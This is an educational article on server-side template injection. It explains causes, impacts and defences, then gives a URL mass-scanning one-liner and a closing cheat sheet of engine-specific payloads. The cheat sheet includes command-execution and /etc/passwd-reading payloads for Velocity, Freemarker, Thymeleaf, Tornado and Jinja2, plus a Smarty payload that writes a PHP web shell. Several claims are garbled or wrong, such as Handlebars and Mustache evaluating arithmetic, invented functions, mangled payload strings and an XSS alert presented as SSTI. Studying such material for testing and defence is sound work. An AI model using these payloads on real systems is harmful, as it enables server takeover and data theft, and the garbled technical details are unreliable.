What is SSTI, and How to exploit?

Definition: 
Server-Side Template Injection (SSTI) is a web application vulnerability where an attacker can inject malicious code into server-side templates. This occurs when unvalidated user input is mistakenly treated as code by the template engine, leading to the execution of the injected payload on the server, potentially allowing unauthorized access and control over the application.

Impact of SSTI: 
SSTI vulnerabilities can have severe consequences, including remote code execution, data manipulation, and unauthorized access to sensitive information. The impact of an SSTI attack depends on the template engine in use and the specific application's implementation.

a.	Remote Code Execution (RCE): One of the most significant impacts of SSTI is the ability for attackers to execute arbitrary code on the server. By injecting malicious code into templates, threat actors can take control of the server-side operations. This allows them to run commands and scripts, leading to unauthorized access, data manipulation, and potential server compromise.
b.	Server Takeover: In severe cases, successful SSTI attacks can lead to a complete server takeover. Attackers can gain full control of the backend servers, enabling them to modify, delete, or steal data, install backdoors, and launch further attacks on internal infrastructure.
c.	Unauthorized Data Access: Even if remote code execution is not achieved, SSTI can still enable attackers to access sensitive data stored on the server. This data breach can have serious consequences, especially involving personal or financial information.
d.	Disruptions and Outages: SSTI attacks can disrupt the normal functioning of web applications, leading to downtime and service outages. This can impact user experience, reputation, and business operations.
e.	Escalation to Other Attacks: Once attackers gain a foothold through SSTI, they can use it as a basis for launching other attacks, such as Cross-Site Scripting (XSS), SQL Injection, or Directory Traversal. This makes SSTI a gateway for more sophisticated and damaging exploits.
f.	Compliance and Legal Consequences: Organizations that fail to protect against SSTI and experience security breaches may face legal liabilities, compliance issues, and damage to their reputation.


Vulnerability Causes
a.	Insufficient Input Validation: SSTI vulnerabilities occur when web applications fail to properly validate user input before incorporating it into templates. Without proper validation, attackers can inject malicious code or payloads into templates, leading to code execution on the server.
b.	Lack of output Escaping: Output escaping is a security mechanism that prevents user-supplied data from being interpreted as code. When web applications do not escape user input before rendering it in templates, it can result in SSTI vulnerabilities. Attackers can exploit this to inject malicious code that will be executed when the template is rendered.
c.	Dynamic Template Generation: Template engines combine fixed templates with dynamic data to generate web pages. When the dynamic data is not handled securely, it opens the door to SSTI vulnerabilities. Attackers can manipulate the dynamic data to inject their own code into the templates.
d.	Usage of Complex Templating Engines: Some templating engines offer robust features and support user-supplied markup, making them vulnerable to SSTI if not used properly. These features may enable attackers to execute arbitrary code by exploiting the template engine's functionalities.

Template Engines are software components or libraries that facilitate the generation of dynamic content for web applications. Web development commonly uses them to separate the presentation layer (HTML templates) from the application logic (server-side code). Template engines allow developers to create reusable templates that contain placeholders for dynamic data. When a request is made to the web application, the template engine processes the template. It replaces the placeholders with actual data before sending the rendered content to the client's browser.

Key functionalities of template engines include:
1.	Placeholder Replacement: Template engines use placeholders (also known as variables or tags) in the template files to indicate where dynamic data should be inserted. These placeholders are typically represented within curly braces or square brackets, such as {{ variable_name }}.
2.	Conditional Statements: Template engines support conditional statements, such as if-else and loops, which enable developers to control data flow and customize the content based on certain conditions.
3.	Template Inheritance: Many template engines support template inheritance, where developers can create a base template with common elements (e.g., header, footer) and extend or override specific sections in child templates. This promotes code reusability and maintainability.
4.	Output Escaping: Template engines often provide built-in mechanisms for output escaping. This helps prevent XSS (Cross-Site Scripting) attacks by automatically encoding user-supplied data before rendering it in the template.
5.	Filters and Transformations: Some template engines offer filters or transformations that allow developers to manipulate the data before inserting it into the template—for example, formatting dates or converting text to uppercase.

Examples of Template Engines:

1.	Handlebars: Handlebars.js is a popular template engine that simplifies creating semantic templates with minimal logic. It uses {{}} and {{{}}} for placeholder replacement and provides basic control structures for conditional rendering.

Example Template using Handlebars:

<!DOCTYPE html>
<html>
<head>
    <title>{{ title }}</title>
</head>
<body>
    <h1>{{ heading }}</h1>
    {{#each items}}
        <p>{{ this }}</p>
    {{/each}}
</body>
</html>
2.	EJS (Embedded JavaScript): EJS is a simple templating engine that allows developers to embed JavaScript code directly into the template. It uses <% %> and <%= %> tags for code execution and output rendering.

Example Template using EJS:

<!DOCTYPE html>
<html>
<head>
    <title><%= title %></title>
</head>
<body>
    <h1><%= heading %></h1>
    <% for (let item of items) { %>
        <p><%= item %></p>
    <% } %>
</body>
</html>

3.	Freemarker: 
Freemarker is a robust template engine that supports various template languages, including XML, HTML, and plain text. It provides strong control structures, macros, and functions for template customization.

Example Template using Freemarker:

<!DOCTYPE html>
<html>
<head>
    <title>${title}</title>
</head>
<body>
    <h1>${heading}</h1>
    <#list items as item>
        <p>${item}</p>
    </#list>
</body>
</html>

Each template engine has its unique syntax and features, catering to different developer preferences and project requirements. Developers need to be aware of potential vulnerabilities like SSTI and implement secure coding practices to prevent exploitation when using template engines.


e.	Failure to Implement Security Mechanisms: Some template engines provide security mechanisms, such as sandboxing or whitelisting, to protect against SSTI. However, vulnerabilities can still occur if these mechanisms are not properly configured or utilized.
f.	Frequent Template Customization: Web applications that allow users to customize templates may inadvertently expose themselves to SSTI. If customization is not controlled or sanitized effectively, attackers can inject malicious code through customization features.
g.	Lack of Security Awareness: Developers and organizations may not be aware of the risks associated with SSTI vulnerabilities or may not have sufficient knowledge to implement secure coding practices to prevent such issues.


2.	TYPES of SSTI Vulnerabilities:
a.	Input Concatenation Vulnerability: This type of SSTI vulnerability occurs when user input is directly concatenated into templates without proper validation or sanitization. Attackers can exploit this vulnerability by injecting malicious code or payloads into the template, which is then executed server-side.
Practical Example Scenario: 
A web application uses a template engine that allows user customization of email templates. The application will enable users to input their name, which is then directly concatenated into the email template without proper validation.

Vulnerable Code:

<html>
<head>
    <title>Welcome Email</title>
</head>
<body>
    <p>Dear {{ user_input_name }},</p>
    <p>Welcome to our website!</p>
</body>
</html>

Exploitation: An attacker could input malicious code as their name, like "{{ 7 * 7 }}", resulting in the following template after rendering:

<html>
<head>
    <title>Welcome Email</title>
</head>
<body>
    <p>Dear 49,</p>
    <p>Welcome to our website!</p>
</body>
</html>

In this case, the malicious payload "{{ 7 * 7 }}" is executed server-side, leading to "Dear 49" in the email, demonstrating successful exploitation.


b.	Lack of Output Escaping Vulnerability: When web applications fail to escape user input before rendering it in templates, it can lead to SSTI vulnerabilities. Attackers can inject malicious code to be executed when the template is rendered, allowing them to manipulate the template engine.

Practical Example Scenario: 
A web application uses a template engine to generate dynamic product listings on an e-commerce site. The application fails to escape user input before rendering it in the template.


Vulnerable Code:

<!DOCTYPE html>
<html>
<head>
    <title>{{ product_name }}</title>
</head>
<body>
    <h1>{{ product_name }}</h1>
    <p>Description: {{ product_description }}</p>
</body>
</html>

Exploitation: 
An attacker could inject a malicious script as the product name:

<script>alert("XSS Attack!");</script>

When a user views the product page, the injected script will be executed as part of the template rendering, resulting in a pop-up alert with "XSS Attack!".


Types of SSTI Attacks:
a.	Remote Code Execution (RCE): The most severe impact of SSTI vulnerabilities is the ability of attackers to achieve remote code execution on the server. By injecting malicious payloads into templates, attackers can gain full control of the backend servers and execute arbitrary code.

Example Scenario:
Suppose a web application allows users to customize their profile page by providing a template with dynamic content using a template engine. The application fails to properly validate and sanitize the user's template input, which creates an SSTI vulnerability.

Vulnerable Code:

<!DOCTYPE html>
<html>
<head>
    <title>User Profile</title>
</head>
<body>
    <h1>Hello, {{ user_input_name }}!</h1>
    {{ user_input_template }}
</body>
</html>

Exploitation:
An attacker crafts a malicious payload in the user's template input:
{{ 7 * 7 }}

When the profile page of the targeted user is viewed, the malicious payload will be executed server-side. This results in the following output:
Hello, User!
49

In this case, the payload {{ 7 * 7 }} is executed as code on the server, leading to the arithmetic operation and the value 49 being rendered on the profile page.


b.	Server Takeover: In cases where RCE is achieved, attackers can use the compromised server to launch additional attacks on internal infrastructure or gain unauthorized access to sensitive data and files.

Example Scenario:
Imagine a blogging platform that allows users to create custom blog templates using a template engine. The platform does not adequately validate and escape the user's input, leading to an SSTI vulnerability.

Vulnerable Code:

<!DOCTYPE html>
<html>
<head>
    <title>{{ user_input_title }}</title>
</head>
<body>
    <h1>{{ user_input_title }}</h1>
    {{ user_input_content }}
</body>
</html>

Exploitation:
An attacker exploits the SSTI vulnerability by injecting malicious code into the blog template:

{{ config['SECRET_KEY'] }}

When a visitor views the malicious blog post, the attacker gains access to the server's configuration data, including sensitive information like the application's secret key. This information can then be used to launch further attacks and compromise the server.

c.	Data Leakage: Even when remote code execution is impossible, attackers may still be able to read sensitive data or files stored on the server. This can lead to the exposure of confidential information.

Example Scenario:
Suppose an online store uses a template engine to generate product pages. The application fails to properly validate and escape user input in the product templates, leading to an SSTI vulnerability.

Vulnerable Code:

<!DOCTYPE html>
<html>
<head>
    <title>{{ product_name }}</title>
</head>
<body>
    <h1>{{ product_name }}</h1>
    <p>Description: {{ product_description }}</p>
</body>
</html>

Exploitation:
An attacker injects malicious code into the product description:

{{ file_read('/etc/passwd') }}

When a user views the product page, the attacker gains access to the contents of the /etc/passwd file. This could potentially expose sensitive information about system users.

d.	Escalation of Privileges: Depending on the application's context, successful SSTI attacks might allow attackers to escalate their privileges and access functionalities or resources they should not have.

Example Scenario:
Consider an application where users can create and share dynamic email templates using a template engine. The application fails to validate and sanitize user input in the template creation process, creating an SSTI vulnerability.

Vulnerable Code:

<!DOCTYPE html>
<html>
<head>
    <title>Email Template</title>
</head>
<body>
    <h1>Hello, {{ user_input_name }}!</h1>
    <p>{{ user_input_template }}</p>
</body>
</html>

Exploitation:
An attacker injects a malicious payload in the template:

{{ user.isAdmin() }}

When an email is sent using the malicious template, the payload executes on the server, and the attacker gains information about the user's privileges. If the payload returns true, indicating that the user is an admin, the attacker may gain unauthorized access to admin-only functionalities or sensitive resources.


3.	How to execute the Attack:

a.	Template Syntax: To exploit SSTI, attackers need to understand the specific syntax and behaviour of the template engine used by the web application. Different template engines have their own syntax rules and ways of incorporating dynamic data into templates. By understanding these rules, attackers can manipulate the templates to inject malicious code.
How to Identify:
1.	Source Code Analysis:
Review the application's source code and look for hints or explicit references to the used template engine. Developers often include comments or specific imports related to the template engine.
Example: In the source code of a web application, you find the following import statement: import { Mustache } from 'mustache';. This indicates that the application is using the Mustache template engine.
2.	Error Messages:
Trigger errors deliberately and observe the error messages. Some template engines may reveal their names or internal details in error messages, giving clues about the template engine in use.
Example: By intentionally injecting malformed code into a form field, the application throws an error message like "Template Engine Error: Failed to parse template." This error message suggests that a template engine is in use.
3.	Template Syntax:
Examine the syntax used in the templates. Different template engines have distinct syntax patterns and delimiters. By analyzing these patterns, you can infer the template engine being used.
Example: After analyzing the templates, you notice the following syntax: {{ user.name }}. This syntax is commonly associated with the Handlebars template engine.
4.	Request Headers:
Look at the response headers received from the server. Some web applications may include headers indicating the template engine or other relevant information.
Example: Inspecting the response headers, you find a header like X-Powered-By: Django/3.2.1. The presence of "Django" in the header indicates the usage of the Django template engine.
5.	Debug Information:
Check for any debug or development information exposed in the application responses. Some template engines may include details about the rendering process or the template engine itself.
Example: The application's response contains a comment like <!-- Rendered using Twig Template Engine -->. This comment provides valuable insight into the template engine being used.
6.	Default File Extensions:
Common template engines have specific file extensions (e.g., .html for Jinja2, .ejs for EJS). You might identify the template engine based on the response by accessing URLs with different file extensions.
Example: Accessing URLs with different file extensions (e.g., .html, .ejs, .jinja) and observing the responses can reveal the template engine. If accessing example.com/test.html results in dynamic content, it might indicate the usage of a template engine like Jinja2.
7.	Template Markup Tags:
Different template engines may have unique markup tags or attributes in their templates. Look for these patterns in the HTML source code.
Example: In the HTML source code, you find <% for(var i=0; i<items.length; i++) { %>. This syntax indicates the usage of the EJS (Embedded JavaScript) template engine.
8.	Online Tools and Libraries:
Some online tools and libraries can automatically detect the template engine based on the input provided. Use these tools for initial analysis.
Example: Using an online tool, you input a template snippet, and the tool identifies it as Jinja2. This tool helps in the quick initial analysis of the template engine.


b.	Payloads: Attackers craft payloads containing malicious code that exploit the template engine's vulnerabilities. These payloads are carefully designed to take advantage of the template's native syntax and execute arbitrary commands on the server. The payload may include template directives, expressions, or functions to achieve remote code execution.
(Discussed at the end)
c.	Context Awareness: Identifying the context in which user input is used is crucial for successful SSTI exploitation. Attackers must recognize where user-supplied data is directly inserted into templates without proper validation or escaping. It could be in URL parameters, form inputs, or other template data sources.


4.	Security Tools and Testing: 
Security professionals use various security tools and testing techniques to detect and mitigate Server-Side Template Injection (SSTI) vulnerabilities. These tools help identify potential vulnerabilities and assess the effectiveness of preventive measures. Here are some standard security tools and testing methods used for SSTI:

a.	Static Code Analysis:
Static code analysis tools scan the source code of web applications without executing them. They analyze the code for potential vulnerabilities, including SSTI. By detecting vulnerable patterns and unsafe coding practices, these tools can provide early detection of SSTI risks during development.
Example Tools:

•	SonarQube
•	FindBugs
•	ESLint

b.	Dynamic Application Security Testing (DAST):
DAST tools test web applications in a running state by sending various HTTP requests and analyzing the responses. They help identify vulnerabilities that might not be apparent in the source code. DAST tools can simulate user input and analyze the application's responses for any signs of SSTI vulnerabilities.
Example Tools:

•	OWASP ZAP
•	Burp Suite
•	Acunetix
•	TPLmap (Discontinued in 2018 but still working in 2023) 
•	TPLmap also has a burp extension in external download (Github) 

5.	Preventive Measures

To prevent SSTI vulnerabilities, web developers should follow best practices, such as:

a.	Input Validation: Ensure all user input is correctly validated and sanitized before being used in templates.
b.	Contextual output Escaping: Implement context-aware output escaping to prevent user-supplied data from being interpreted as code.
c.	Use Secure Template Engines: Some template engines offer features like sandboxing and whitelisting to mitigate the risks of SSTI.
d.	Implement Whitelisting: When using user-supplied data in templates, it is beneficial to implement whitelisting. Define a list of allowed input values or patterns and validate user input against this whitelist. Reject any input that does not match the predefined safe patterns.
e.	Disable Code Evaluation: Avoid using template engines or configurations that allow direct code evaluation. Disable or limit the usage of template directives that execute code on the server. Instead, use safer alternatives for dynamic content rendering.
f.	Strict Template Access Control: Limit access to template editing and rendering functionalities to authorized personnel only. Avoid giving template customization privileges to end-users without proper validation and controls.
g.	Content Security Policies (CSP): Implement Content Security Policies in web applications to restrict the sources of content allowed to be rendered in the application. This can help prevent malicious code injection and mitigate the risks of SSTI.
h.	Regular Security Audits: Conduct regular security audits and code reviews to identify potential SSTI vulnerabilities and other security flaws. Address any identified issues promptly to ensure the application's security.
i.	 Security Training: Educate developers and stakeholders about SSTI vulnerabilities and secure coding practices. Awareness of potential risks can help the development team take proactive measures to prevent vulnerabilities during development.
j.	Follow Security Guidelines: Adhere to security guidelines and best practices provided by template engine developers and security communities. These guidelines often include recommendations to prevent SSTI vulnerabilities.
k.	Implement Web Application Firewall (WAF): Consider deploying a WAF that is capable of detecting and blocking SSTI attack patterns. A WAF can act as an additional layer of defence to filter out potentially malicious requests.
l.	Keep Software Up to Date: Ensure that the application's template engines, web frameworks, and other software components are updated with the latest security patches and updates. This helps protect against known vulnerabilities in third-party libraries.
m.	Least Privilege Principle: Limit the privileges of the template engine to only the necessary resources and functionality. Avoid running the template engine with excessive permissions that could allow it to execute arbitrary code or access sensitive data.


6.	Current Trends in SSTI:

•	Increased Awareness: With the rise in high-profile security breaches, there is a growing awareness among developers and organizations about the risks of SSTI vulnerabilities. Developers are becoming more cautious about using template engines and are adopting secure coding practices to prevent SSTI.

•	Complex Template Engines: Modern web applications often use complex template engines to enable dynamic content generation. However, these advanced engines also introduce new attack surfaces for SSTI. Attackers leverage the power of template engines to craft sophisticated payloads and evade detection.

For example, attackers may use chained template expressions or nested injections to bypass security filters.


•	Third-Party Libraries: Many web applications rely on third-party libraries and frameworks, including template engines. SSTI vulnerabilities can also emerge from flaws in these libraries, especially if they are not kept up-to-date or have their security features misconfigured.

•	Template Language Features: Template engines provide various features that attackers can misuse to execute arbitrary code. For instance, access to object properties, function calls, or even file system operations may be possible if not adequately controlled.

For example, some template languages allow access to object properties, function calls, or even file system operations. If not properly controlled, these features can lead to SSTI vulnerabilities.

•	Advanced Payload Obfuscation: Attackers employ advanced techniques to obfuscate their SSTI payloads and evade detection by security tools. They use encoding, escaping, and other tricks to hide malicious code within templates.

7.	Best Practices
a.	Stay Informed: Keep up-to-date with the latest security issues and SSTI mitigation techniques.
b.	Regular Security Testing: Regularly perform security testing, including input validation testing and vulnerability scanning, to identify and address potential SSTI vulnerabilities.
c.	Security Awareness and Training: Educate developers and security teams about the risks associated with SSTI vulnerabilities and the best practices for secure coding and template usage. Web security professionals and developers should be aware of SSTI and take appropriate measures to protect their applications from this type of Attack. By following secure coding practices and staying informed about the latest security issues, web applications can better defend against SSTI vulnerabilities and other potential threats.

Multiple URL Test Payload:

cat urls.txt | gau -subs | grep '=' | egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|.css|.ico)' | qsreplace "ssti{{ 7*7 }}" | while read url; do cur=$(curl -s "$url" | grep "ssti49"); echo -e "$url -> $cur"; done

1.	cat urls.txt: This command is used to read the contents of the urls.txt file, which presumably contains a list of URLs to be tested.
1.	gau -subs: This part of the command uses the gau tool with the -subs flag to discover URLs with subdomains.
2.	grep '=': This command filters out URLs that contain the equal sign '=' symbol. This is used to find URLs that might have query parameters.
3.	egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|.css|.ico)': This part filters out URLs that have specific file extensions like JavaScript, images, text, and so on. The idea here is to avoid testing URLs that are not likely to be vulnerable.
4.	qsreplace "ssti{{7*7}}": This command uses the qsreplace tool to replace the query parameter value with the payload "ssti{{77}}". The payload "ssti{{77}}" is used to test for SSTI vulnerability by evaluating the expression 7*7 on the server side.
5.	while read url; do cur=$(curl -s $url | grep "ssti49"); echo -e "$url -> $cur"; done: This part loops through each URL from the filtered list, sends a request using curl, and then checks if the response contains "ssti49". If "ssti49" is found in the response, it means the payload was successfully injected and evaluated, indicating a potential SSTI vulnerability.

The OUTPUT shows that the URL "https://vulnerable.com/?s=ssti{{7*7}}" is vulnerable to SSTI, as the payload "ssti49" was successfully injected and evaluated.

Here are the payloads rearranged and with some more additional payloads:
Polyglot:
•	$\{\{<['"}}\\  Polyglot payload to test various template engines

1. Jinja2 (Python):
•	{{ 7*7 }}   Evaluates 7*7 to 49
•	{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}   Exploits Jinja2's code execution capabilities to read /etc/passwd

2. Flask/Jinja2: Identify:
•	{{ '7' 7 }}  Identifies Flask and Jinja2
•	{% for c in [1,2,3] %}{{ (c,c,c) }}{% endfor %}  Prints c, c, c for each loop iteration

3. Tornado (Python):
•	{% import os %}{{ os.popen("ls").read() }}  Lists files in the current directory
•	{% import os %}{{ os.system('whoami') }}  Executes 'whoami' command

4. Django Template (Python):
•	{% debug %}  Prints the context and variable values
•	{% debug %}  Prints the context and variable values

5. Handlebars (JavaScript):
•	{{7*7}}  Evaluates 7*7 to 49
    
6. Express (Node.js):
•	#{7*7}  Evaluates 7*7 to 49

7. EJS (JavaScript):
•	<% require('fs').readFileSync('/etc/passwd', 'utf-8') %>   Reads /etc/passwd file

8. AngularJS (with ng-bind):
•	<div ng-bind="7*7"></div>   Evaluates 7*7 to 49

9. AngularJS:
•	{{7*7}}  Evaluates 7*7 to 49
•	{{'ssti'+7*7}}  Injects 'ssti' followed by the result of 7*7

10. Pug (formerly Jade) (JavaScript):
•	p= 7*7 Evaluates 7*7 to 49
•	#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}  Reads /etc/passwd file

11. EJS (JavaScript):
•	<%= 7*7 %>   Evaluates 7*7 to 49

12. Nunjucks (JavaScript):
•	{{ 7*7 }}  Evaluates 7*7 to 49
•	{{ 'ssti'+7*7 }}  Injects 'ssti' followed by the result of 7*7 = ssti49

13. Java:
•	${{7*7}}   Evaluates 7*7 to 49
•	${class.getClassLoader()}   Gets the class loader
•	${class.getResource("").getPath()}   Gets the path of the current resource
•	${class.getResource("../../../../../index.htm").getContent()}  Gets the content of index.htm resource
•	${T(java.lang.System).getenv()}  Gets environment variables
•	${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes().join(" ")}  Reads /etc/passwd file

14. Velocity (Java):
•	#set($a=7*7)${a}  Sets a Velocity variable 'a' to 49 and then outputs it
•	#set($str = $class.inspect("java.lang.String").type)  Gets the type of java.lang.String class
•	#set($chr = $class.inspect("java.lang.Character").type)  Gets the type of java.lang.Character class
•	#set($ex = $class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))  Executes 'whoami' command
•	$ex.waitFor()  Waits for the process to complete
•	#set($out = $ex.getInputStream())  Gets the input stream of the process
•	#foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end  Reads output of process and converts to string

15. Freemarker (Java):
•	<#assign a=7*7>${a}  Assigns Freemarker variable 'a' to 49 and then outputs it
•	#set($a = 7 * 7)${a}  Sets a variable 'a' to 49 and outputs it
•	<#assign command="freemarker.template.utility.Execute"?new()>${command("cat /etc/passwd")}  Exploits Freemarker's code execution capabilities to read /etc/passwd

16. Thymeleaf (Java):
•	[[${7*7}]]  Evaluates 7*7 to 49
•	[[${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream().toString()}]]  Reads /etc/passwd file

17. Smarty (PHP):
•	{$smarty.version}  Prints the version of Smarty
•	{$smarty.template_object}  Prints the current template object
•	{{7*7}}  Evaluates 7*7 to 49
•	{php}echo "id";{/php}  Executes 'id' command
•	{Smarty_Internal_write_File::writeFile($SCRIPT_NAME, "<?php passthru($_GET['cmd']);?>", self::clearConfig())}  Exploits Smarty's code execution capabilities to execute commands

18. Slim (PHP):
•	{{ 7*7 }}  Evaluates 7*7 to 49
•	{{ file_get_contents('/etc/passwd') }}  Reads /etc/passwd file

19. Twig (PHP):
•	{{ constant('STDIN') }}  Prints the value of STDIN constant
•	{{ 7*7 }}   Evaluates 7*7 to 49
•	{{ dump(app) }}  Prints the entire Symfony application object

20. Blade (Laravel):
•	{{ 7*7 }}  Evaluates 7*7 to 49
•	{{ dd(config) }}  Prints the entire Laravel configuration

21. ERB (Ruby):
•	<%= 7*7 %>  Evaluates 7*7 to 49
•	<%= system("whoami") %> Executes 'whoami' command

22. ASP.NET Razor (C#):
•	@(7*7)  Evaluates 7*7 to 49
•	@(1+2) Evaluates 1+2 to 3
•	@{ // C# code }  C# code block

23. Mojolicious (Perl):
•	<% perl code %> Executes Perl code
•	<% perl code %>  Executes Perl code

24. Mustache:
•	{{{7*7}}}  Evaluates 7*7 to 49




